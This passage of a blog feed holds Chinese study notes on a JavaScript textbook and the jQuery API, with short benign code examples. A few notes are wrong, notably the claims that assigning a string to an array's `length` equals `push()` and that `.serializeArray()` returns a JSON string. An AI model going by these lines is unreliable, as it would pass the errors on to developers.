<li>1995年 JavaScript 1.0</li>
<li>1997年06月 - ECMAScript 1.0</li>
<li>1998年6月 - ECMAScript 2.0</li>
<li>1999年12月 - ECMAScript 3.0</li>
<li>2008年7月 - ECMAScript 3.1</li>
<li>2009年12月 - ECMAScript 5.0</li>
<li>2015年6月 - ECMAScript 6.0</li>
</ul>
</li>
<li>JavaScript 组成<ul>
<li>核心 ECMAScript</li>
<li>文档对象模型 DOM</li>
<li>浏览器对象模型 BOM</li>
</ul>
</li>
<li>混杂模式（quirks mode）， 标准模式（standards mode）和几乎标准模式（almost standards mode）</li>
</ul>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul>
<li><p>使用可读性更高的注释</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> *  这是一个多行注释</div><div class="line"> *  (块级注释)</div><div class="line"> */</div></pre></td></tr></table></figure>
</li>
<li><p><code>&#39;use strict&#39;</code> 使用严格模式编程，有助于培养良好的代码风格</p>
</li>
<li>显式声明变量（这样使用 <code>typeof</code> 返回 <code>undefined</code> 时可知该变量未声明而非未初始化）</li>
<li>5种基本数据类型 <code>undefined</code>， <code>null</code>，<code>boolean</code>，<code>number</code>，<code>string</code> 和一种复杂数据类型 <code>object</code></li>
<li><code>typeof</code> 操作符返回 <code>undefined</code>，<code>boolean</code>，<code>number</code>，<code>string</code>，<code>object</code>，<code>function</code></li>
<li>只有 <code>0</code> 除以 <code>0</code> 会返回 <code>NaN</code>， 整数除以 <code>0</code> 返回 <code>Infinity</code>， 负数除以 <code>0</code> 返回 <code>-Infinity</code></li>
<li><p>后置型递增（递减）与前置型递增（递减）的区别</p>
<blockquote>
<p><code>var nThree = nOne++ + nTwo</code> 相当于 <code>var nThree = nOne + nTwo; nOne++</code><br><code>var nThree = ++nOne + nTwo</code> 相当于 <code>nOne++; var nThree = nOne + nTwo</code><br>记忆技巧是，前增是赋值前就增加，后增是赋值后才增加</p>
</blockquote>
</li>
<li><p>将数字字符串转换成 <code>number</code> 的方法</p>
<ol>
<li><code>var nOne = sOne - 0</code></li>
<li><code>var nTwo = +sTwo</code></li>
<li><code>var nThree = Number(sThree)</code></li>
</ol>
</li>
<li><p>大写字母的字符编码全部小写字母的字符编码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> result = <span class="string">'Brick'</span> &lt; <span class="string">'alphabet'</span> <span class="comment">// true</span></div></pre></td></tr></table></figure>
</li>
<li><p>数字字符串之间的比较</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> result1 = <span class="string">'23'</span> &lt; <span class="string">'3'</span>; <span class="comment">// true</span></div><div class="line"><span class="keyword">var</span> result2 = <span class="string">'23'</span> &lt; <span class="number">3</span>; <span class="comment">// false</span></div><div class="line"><span class="keyword">var</span> result3 = <span class="string">'a'</span> &lt; <span class="number">3</span>; <span class="comment">// false, 'a' 被转换成了 NaN, 任何数与 NaN 比较均是 false</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>for in</code> 出来的顺序不可预测（ECMAScript 中对象属性没有顺序）</p>
</li>
<li>在双层嵌套 <code>for</code> 循环中使用 <code>label</code>，使得可以控制退出到外部的标记 <code>for</code> 循环</li>
<li>禁止使用 <code>with</code> 语句</li>
<li><code>switch</code> 语句比较时使用全等操作符，不发生类型转换</li>
</ul>
<h2 id="变量、作用域和内存问题"><a href="#变量、作用域和内存问题" class="headerlink" title="变量、作用域和内存问题"></a>变量、作用域和内存问题</h2><ul>
<li>ECMAScript 变量是松散的，包括基本类型值（简单数据段）和引用类型值（对象）</li>
<li><p>ECMAScript 中所有参数传递的都是值，不可能通过引用传递参数（原书 71 页）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">    obj.name = <span class="string">'Nicholas'</span></div><div class="line">    obj = <span class="keyword">new</span> <span class="built_in">Object</span>()</div><div class="line">    obj.name = <span class="string">'Greg'</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="built_in">Object</span>()</div><div class="line">setName(person)</div><div class="line">alert(person.name) <span class="comment">// 'Nicholas'</span></div></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>instanceof</code> 操作符检测对象类型：<code>result = variable instanceof constructor</code></p>
</li>
<li>JavaScript 的垃圾收集方式是 <strong>标记清除</strong><blockquote>
<p>IE8 之前的 DOM 与 BOM 对象是以 C++ 实现的 COM 对象，使用引用计数策略回收垃圾（存在循环引用问题）</p>
</blockquote>
</li>
</ul>
<h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><ul>
<li>传递参数时对必须值使用命名参数，对可选参数使用对象</li>
<li><code>aOne.length = &#39;someValue&#39;</code> 等同于 <code>aOne.push(&#39;someValue&#39;)</code></li>
<li><p>ECMAScript 5 中新增了 <code>Array.isArray(value)</code> 方法（IE9+）判断是否为数组</p>
<blockquote>
<p><code>instanceof</code> 操作符假定只有一个全局环境，多框架传递数组时会与各框架中的原生数组具有不同的构造函数</p>
</blockquote>
</li>
<li><p><code>Array.toString()</code> 与 <code>Array.join(&#39;,&#39;)</code> 得到的结果相同</p>
</li>
<li>ECMAScript 5（IE9+）为数组定义了5个迭代方法（这些方法均不改变原数组）：<ul>
<li><code>every()</code>：对数组中的每一项运行给定函数，如果该函数对每一项都返回 <code>true</code>，则返回<code>true</code></li>
<li><code>filter()</code>：对数组中的每一项运行给定函数，返回该函数会返回 <code>true</code> 的项组成的数组。</li>
<li><code>forEach()</code>：对数组中的每一项运行给定函数。这个方法没有返回值。</li>
<li><code>map()</code>：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。</li>
<li><code>some()</code>：对数组中的每一项运行给定函数，如果该函数对任一项返回<code>true</code>，则返回<code>true</code></li>
</ul>
</li>
<li>ECMAScript 5（IE9+）为数组定义了2个归并方法：<code>reduce()</code>，<code>reduceRight()</code></li>
<li>在 ECMAScript 3 中，正则表达式字面量始终共享一个 <code>RegExp</code> 实例（但浏览器实现与 ES5 相同）</li>
<li>严格模式下不能使用 <code>arguments.callee</code></li>
<li><code>toExponential()</code> 方法返回以指数表示法（也称e表示法）表示的数值的字符串形式。</li>
<li><p>IE8+ 支持方括号表示法访问个别字符</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> stringValue = <span class="string">'hello world'</span></div><div class="line">alert(stringValue.charAt(<span class="number">1</span>)) <span class="comment">// 'e'</span></div><div class="line">alert(stringValue[<span class="number">1</span>]) <span class="comment">// 'e'，不兼容低版本</span></div></pre></td></tr></table></figure>
</li>
<li><p>ECMAScript 5 新增了字符串方法 <code>trim()</code></p>
</li>
<li><code>replace(&#39;{字符串或正则}&#39;, &#39;{替换字符或函数}&#39;)</code>，第一个参数参数是字符串时只替换第一个匹配项, 要全局替换必须用正则且指定全局（g）, 第二个参数可以附加特殊字符序列进行高级替换</li>
</ul>
<h2 id="面向对象的程序设计"><a href="#面向对象的程序设计" class="headerlink" title="面向对象的程序设计"></a>面向对象的程序设计</h2><h4 id="理解对象"><a href="#理解对象" class="headerlink" title="理解对象"></a>理解对象</h4><ul>
<li>数据属性<ul>
<li><strong>Configurable</strong> 默认为 <code>true</code></li>
<li><strong>Enumerable</strong> 默认为 <code>true</code></li>
<li><strong>Writable</strong> 默认为 <code>true</code></li>
<li><strong>Value</strong> 默认为 <code>undefined</code></li>
</ul>
</li>
<li>访问器属性<ul>
<li><strong>Configurable</strong> 默认 <code>true</code></li>
<li><strong>Enumerable</strong> 默认 <code>true</code></li>
<li><strong>Get</strong> 默认 <code>undefined</code></li>
<li><strong>Set</strong> 默认 <code>undefined</code></li>
</ul>
</li>
<li>属性前面包含下划线一般表示只能通过对象方法访问的属性：<code>_property</code></li>
</ul>
<h4 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h4><ul>
<li><p>工厂模式——传入参数并返回参数作为值的对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPerson</span>(<span class="params">name, age, job</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>()</div><div class="line">  o.name = name</div><div class="line">  o.sayName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="keyword">this</span>.name)</div><div class="line">  &#125;;</div><div class="line">  <span class="keyword">return</span> o</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> person1 = createPerson(<span class="string">'Nicholas'</span>, <span class="number">29</span>, <span class="string">'Software Engineer'</span>)</div></pre></td></tr></table></figure>
</li>
<li><p>工厂模式不能解决对象识别的问题</p>
</li>
</ul>
<h4 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a>构造函数模式</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, job</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.name = name</div><div class="line">  <span class="keyword">this</span>.age = age</div><div class="line">  <span class="keyword">this</span>.job = job</div><div class="line">  <span class="keyword">this</span>.sayName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="keyword">this</span>.name)</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">'Nicholas'</span>, <span class="number">29</span>, <span class="string">'Software Engineer'</span>)</div></pre></td></tr></table></figure>
<ul>
<li>构造函数的问题在于每个实例都要重建一遍，不能完成共享</li>
</ul>
<h4 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125; <span class="comment">//空构造函数</span></div><div class="line">Person.prototype.name = <span class="string">'Nicholas'</span></div><div class="line">Person.prototype.age = <span class="number">29</span></div><div class="line">Person.prototype.job = <span class="string">'Software Engineer'</span></div><div class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="keyword">this</span>.name)</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person()</div></pre></td></tr></table></figure>
<ul>
<li>理解原型对象<ul>
<li>ES5 中使用 <code>Object.getPrototypeOf()</code> 可以方便地取得一个对象的原型</li>
<li>使用 <code>hasOwnProperty()</code> 方法可以检测一个属性是存在于实例中，还是存在于原型中,常用语 <code>for-in</code> 中区分原型（IE8存在 Bug，<code>for-in</code> 循环中不会出现[不可枚举]的属性：<code>hasOwnProperty()</code>，<code>propertyIsEnumerable()</code>，<code>toLocaleString()</code>，<code>toString()</code> 和 <code>valueOf()</code>）。</li>
<li>原型具有动态性，所做修改立刻在所有实例上体现，跟是否已创建实例无关（指针）</li>
</ul>
</li>
</ul>
<h4 id="其他模式"><a href="#其他模式" class="headerlink" title="其他模式"></a>其他模式</h4><ul>
<li>最常用的默认方式：构造函数与原型模式同时使用</li>
<li>动态原型模式可以灵活地初始化原型</li>
<li>寄生构造函数模式，使用工厂模式的构造函数（尽量不用）</li>
<li>稳妥构造函数模式（安全，没有公共属性，不适用 <code>this</code> 和 <code>new</code>）</li>
</ul>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><ul>
<li>所有函数都是 <strong>Object</strong> 的实例，最终原型指向 <code>Object.prototype</code></li>
<li>通过原型链实现继承时，使用对象字面量创建原型方法会重写原型链</li>
<li>组合使用原型链和借用构造函数是最常用的继承模式</li>
<li><code>Object.create()</code> —— 原型式继承</li>
</ul>
<h2 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h2><ul>
<li>函数声明不要放在语句块中（可使用函数表达式）<h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4></li>
<li>S5 严格模式中不能使用 <code>arguments.callee</code><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//命名函数表达式实现递归</span></div><div class="line"><span class="keyword">var</span> factorial = (<span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params">num</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span></div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">return</span> num * f(num<span class="number">-1</span>)</div><div class="line">  &#125;</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><ul>
<li>过度使用闭包会导致内存占用过多</li>
<li>闭包只能取得包含函数中变量的最后一个值</li>
<li>闭包中的 <code>this</code> 指向 <strong>window</strong> 对象（与匿名函数相同）</li>
<li><p><strong>IE8</strong> 以下浏览器在闭包中保存了 <strong>HTML</strong> 元素，导致这个元素将无法销毁</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">assignHandler</span>(<span class="params"></span>)</span>&#123; <span class="comment">//IE8-中关于HTML元素闭包无法销毁的解决方法</span></div><div class="line">  <span class="keyword">var</span> element = <span class="built_in">document</span>.getElementById(<span class="string">'someElement'</span>)</div><div class="line">  <span class="keyword">var</span> id = element.id</div><div class="line">  element.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    alert(id)</div><div class="line">  &#125;</div><div class="line">  element = <span class="literal">null</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>重新声明变量但不赋值将被忽略</p>
</li>
</ul>
<h2 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h2><ul>
<li><p>全局变量不能通过 <code>delete</code> 操作符删除，而直接在 <strong>window</strong> 对象上的定义的属性可以，尝试访问 <strong>window</strong> 上定义的属性不会抛出错误</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 这里会抛出错误，因为 oldValue 未定义</span></div><div class="line"><span class="keyword">var</span> newValue = oldValue</div><div class="line"><span class="comment">// 这里不会抛出错误，因为这是一次属性查询</span></div><div class="line"><span class="comment">// newValue 的值是 undefined</span></div><div class="line"><span class="keyword">var</span> newValue = <span class="built_in">window</span>.oldValue</div></pre></td></tr></table></figure>
</li>
<li><p>跨浏览器取得窗口左边和上边的位置</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// IE、Safari、Opera 和 Chrome 支持 window.screenLeft</span></div><div class="line"><span class="comment">// Firefox、Safari 和 Chrome 支持 window.screenX</span></div><div class="line"><span class="keyword">var</span> leftPos = (<span class="keyword">typeof</span> <span class="built_in">window</span>.screenLeft == <span class="string">'number'</span>) ? <span class="built_in">window</span>.screenLeft : <span class="built_in">window</span>.screenX</div><div class="line"><span class="keyword">var</span> topPos = (<span class="keyword">typeof</span> <span class="built_in">window</span>.screenTop == <span class="string">'number'</span>) ? <span class="built_in">window</span>.screenTop : <span class="built_in">window</span>.screenY</div></pre></td></tr></table></figure>
</li>
<li><p>跨浏览器获得页面 <strong>ViewPort</strong> 大小</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> pageWidth = <span class="built_in">document</span>.documentElement.clientWidth <span class="comment">//IE7+</span></div><div class="line"><span class="keyword">var</span> pageHeight = <span class="built_in">document</span>.documentElement.clientHeight <span class="comment">//IE7+</span></div></pre></td></tr></table></figure>
</li>
<li><p>使用超时调用来模拟间歇调用是一种最佳模式（不用手动停止调用）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> num = <span class="number">0</span></div><div class="line"><span class="keyword">var</span> max = <span class="number">10</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">incrementNumber</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  num++</div><div class="line">  <span class="comment">//如果执行次数未达到 max 设定的值，则设置另一次超时调用</span></div><div class="line">  <span class="keyword">if</span> (num &lt; max) &#123;</div><div class="line">    setTimeout(incrementNumber, <span class="number">500</span>)</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    alert(<span class="string">'Done'</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">setTimeout(incrementNumber, <span class="number">500</span>)</div></pre></td></tr></table></figure>
</li>
<li><p><strong>location</strong> 对象</p>
<blockquote>
<p><code>document.location</code> 与 <code>window.location</code> 引用同一个对象</p>
<ul>
<li>赋值给 <code>location.href</code> 实际上调用了 <code>location.assign()</code> 方法，此方式会生成浏览记录</li>
<li><code>location.replace(&#39;http://www.wrox.com/&#39;)</code> 则不会在历史纪录中留下痕迹</li>
<li><code>location.reload(true)</code>，不传 <code>true</code> 则可能从缓存中加载</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><ul>
<li><strong>DOM</strong> 有12种节点类型 <code>nodeType</code></li>
<li><p><code>var arrayOfNodes = Array.prototype.slice.call(someNode.childNodes,0)</code>  这个写法在 <strong>IE8</strong> 及之前版本中无效</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> html = <span class="built_in">document</span>.documentElement <span class="comment">// 取得对 &lt;html&gt; 的引用</span></div><div class="line"><span class="keyword">var</span> body = <span class="built_in">document</span>.body <span class="comment">// 取得对 &lt;body&gt; 的引用</span></div><div class="line"><span class="keyword">var</span> doctype = <span class="built_in">document</span>.doctype <span class="comment">// 取得对 &lt;!DOCTYPE&gt; 的引用</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>document.URL</code> 与 <code>windows.location.href</code> 输出一样，但前者只读</p>
</li>
<li>在 <strong>HTML</strong> 中，标签名始终都以全部大写表示，但保险起见，比较前应转化大小写<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (element.tagName == <span class="string">"div"</span>)&#123; <span class="comment">// 不能这样比较，很容易出错！</span></div><div class="line">  <span class="comment">//在此执行某些操作</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (element.tagName.toLowerCase() == <span class="string">"div"</span>)&#123; <span class="comment">// 这样最好（适用于任何文档）</span></div><div class="line">  <span class="comment">//在此执行某些操作</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="DOM扩展"><a href="#DOM扩展" class="headerlink" title="DOM扩展"></a>DOM扩展</h2><ul>
<li><code>querySelector()</code> 和 <code>querySelectorAll()</code>（IE8+）</li>
<li><p><code>readyState</code> 属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// loading，正在加载文档</span></div><div class="line"><span class="comment">// complete，已经加载完文档</span></div><div class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.readyState == <span class="string">"complete"</span>)&#123;</div><div class="line">  <span class="comment">//执行操作</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p><code>scrollIntoView()</code></p>
</li>
<li><code>querySelector()</code>和<code>querySelectorAll()</code> (IE8+)</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;堪称JavaScript中的必读圣经，又叫红宝书，第一部分主要讲解了语言特性，尤其是关于原型／继承的部分实在精彩&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/JavaScript高级程序设计.jpg&quot; alt=&quot;JavaScript高级程序设计&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>jQuery API 学习小扎（下）</title>
    <link href="https://github.com/Hyifu/2015/11/12/jQuery-API%E5%AD%A6%E4%B9%A0%E5%B0%8F%E6%89%8E%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>https://github.com/Hyifu/2015/11/12/jQuery-API学习小扎（下）/</id>
    <published>2015-11-11T16:00:00.000Z</published>
    <updated>2017-04-17T02:40:05.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>续，非DOM操作的部分，这里提供了很多小工具，但精华的部分还是关于回调对象和延迟对象。</p>
</blockquote>
<a id="more"></a>
<h2 id="AJAX事件"><a href="#AJAX事件" class="headerlink" title="AJAX事件"></a>AJAX事件</h2><h4 id="全局-辅助方法"><a href="#全局-辅助方法" class="headerlink" title="全局/辅助方法"></a>全局/辅助方法</h4><ul>
<li><p>jQuery 全局 <strong>Ajax</strong> 事件的所有处理程序，必须附加到 <code>document</code> 上</p>
<blockquote>
<p>无论哪一个 <strong>Ajax</strong> 请求被发送，所有 <strong>Ajax</strong> 全局处理器都将被执行</p>
<p><code>$.ajax()</code> 或 <code>$.ajaxSetup()</code> 调用时，<code>global</code> 选项设置为 <code>false</code> 时将不触发全局事件</p>
</blockquote>
</li>
<li><p><code>.serialize(JQ对象)</code>、<code>.serializeArray(array)</code> 和 <code>$.param(obj)</code> 均用来序列化格式：</p>
<blockquote>
<p><code>$.param(obj)</code> =&gt; URL查询字符串或 <strong>Ajax</strong> 请求<br><code>.serializeArray(array)</code> =&gt; 返回 <strong>JSON</strong> 格式的字符串<br><code>.serialize()</code> =&gt; 将表单元素的值编译成字符串</p>
</blockquote>
</li>
</ul>
<h3 id="接口及快捷方式"><a href="#接口及快捷方式" class="headerlink" title="接口及快捷方式"></a>接口及快捷方式</h3><ul>
<li>由于浏览器的安全限制，大多数 <strong>Ajax</strong> 有同源政策限制：该请求不能成功地检索来自不同的域，子域或协议的数据</li>
<li><p><code>$.get(url [,data][,success(data,textStatus,jqXHR)][, dataType])</code>，相当于</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$.ajax(&#123;</div><div class="line">    <span class="attr">url</span>: url,</div><div class="line">    <span class="attr">data</span>: data,</div><div class="line">    <span class="attr">success</span>: success,</div><div class="line">    <span class="attr">dataType</span>: dataType</div><div class="line">&#125;);</div><div class="line"></div><div class="line">$.get(<span class="string">'test.html'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123; <span class="comment">// 最常见用法</span></div><div class="line">    <span class="comment">// do something...</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
<li><p><code>$.getJSON(url [, data][, success(data, textStatus,jqXHR)])</code> 请求 <strong>JSON</strong> 编码数据</p>
</li>
<li><code>$.getScript(url [, success(data, textStatus, jqXHR)])</code> 请求 <strong>JavaScript</strong> 文件</li>
<li><code>.load( url [, data] [, complete(responseText, textStatus, XMLHttpRequest)])</code><br>  <code>$(&#39;#result&#39;).load(&#39;ajax/test.html&#39;);</code></li>
<li><code>$.post(url [, data] [, success(data, textStatus, jqXHR)] [, dataType])</code><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$.post(<span class="string">'test.php'</span>, &#123; <span class="attr">name</span>: <span class="string">'John'</span>, <span class="attr">time</span>: <span class="string">'2pm'</span> &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">	alert(<span class="string">'Data Loaded: '</span> + data);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="核心及其他"><a href="#核心及其他" class="headerlink" title="核心及其他"></a>核心及其他</h2><h4 id="jQuery对象"><a href="#jQuery对象" class="headerlink" title="jQuery对象"></a>jQuery对象</h4><ul>
<li><code>jQuery()</code><ul>
<li>等价于 <code>$()</code></li>
<li><code>$(selector [, context])</code> 通过提供的选择器检索 DOM 元素并返回 jQuery 对象</li>
<li><code>$(this)</code> 可调用 <code>this</code> 指向元素的 jQuery 方法</li>
<li><code>$(&#39;span&#39;, this)</code> 等价于 <code>$(this).find(&#39;span&#39;)</code>， 用来为检索元素做限制范围</li>
<li><code>$(原生DOM)</code> 将原生 DOM 转换成 jQuery 对象</li>
<li><code>$(&#39;HTML&#39;)</code> 将 HTML 转换成 DOM 元素</li>
</ul>
</li>
</ul>
<blockquote>
<p>如 jQuery 对象为空，则 <code>.length</code> 属性为 <code>0</code>，可用于检测 jQuery 对象是否为空</p>
<p>当 HTML 为没有属性的简单标签,一般调用原生 <code>.createElement()</code>，其他情况用 <code>.innerHTML</code> 机制，在此过程中，浏览器可能过滤掉某些元素如 <code>&lt;html&gt;</code> 等。此外 <code>jQuery()</code> 要求 HTML 字符串是以 <code>&lt;</code> 开头的字符串（即文本节点不能出现在HTML字符串前面）</p>
</blockquote>
<ul>
<li><p><code>jQuery.noConflict([removeAll])</code>  判断是否从全局作用域中内去除所有 jQuery 变量（包括 jQuery 本身）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">jQuery.noConflict();</div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">$</span>) </span>&#123;</div><div class="line">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="comment">// 继续使用 $ 代表 jQuery</span></div><div class="line">    &#125;);</div><div class="line">&#125;)(jQuery);</div><div class="line"><span class="comment">// 其它库可以使用 $</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>jQuery.when(deferreds)</code> 执行一个或多个对象的回调函数，<code>Deferred</code>（延迟）对象通常表示异步事件</p>
</li>
</ul>
<h4 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h4><ul>
<li><code>$.each()</code> 遍历一个数组或对象（原生或 jQuery）</li>
<li><code>$.inArray()</code>  返回一个值在数组中的索引位置。如果该值不在数组中，则返回 <code>-1</code>（类似原生 <code>.indexOf()</code> ，使用严格比较 <code>===</code>）</li>
<li><code>$.trim()</code> 去除字符串两端的空格</li>
<li><code>$.map(array, callback)</code> 将一个数组中的所有元素转换到另一个数组中并返回（结果和原数组长度不一定相同）</li>
<li><code>$.grep()</code> 返回数组中符合筛选的项，不影响原数组</li>
<li><code>$.makeArray()</code> 将类似数组的对象转化为普通数组</li>
<li><code>$.type()</code> 判断对象的类别（函数、日期、数组、正则等）</li>
<li><code>$.isFunction()</code> 判断是否为函数</li>
<li><code>$.isArray()</code> 判断是否为数组</li>
<li><code>$.isNumeric()</code> 判断是否为数字</li>
<li><code>$.isWindow(obj)</code> 判断是否为 window 对象（一般用来确认是否为浏览器窗口操作）,</li>
<li><code>$.isXMLDoc(node)</code> 判断是否为 XML 节点</li>
<li><code>$.isEmptyObject()</code> 判断某个对象是否为空（不含包括原型内的任何属性/方法）， 而 <code>$.isPlainObject()</code> 判断某个参数是否为用 <code>{}</code> 或 <code>new Object()</code> 建立的对象</li>
